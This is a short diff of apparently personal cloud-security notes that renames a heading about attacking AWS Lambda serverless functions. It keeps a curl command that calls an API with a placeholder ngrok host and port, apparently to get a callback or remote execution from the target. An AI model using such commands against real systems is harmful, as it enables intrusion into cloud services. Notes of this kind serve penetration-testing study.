@@ -24,7 +24,7 @@ Identity and Access Management (IAM) = the main consept of IMA is Role-Based Acc
 
 ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
-# serverless architecture attack RCE
+# serverless architecture aws lambda attack 
 
 ***curl "https://domain/api/panther?host=ngrock&port=port-numer" -H 'x-api-key: valuehere'***
 
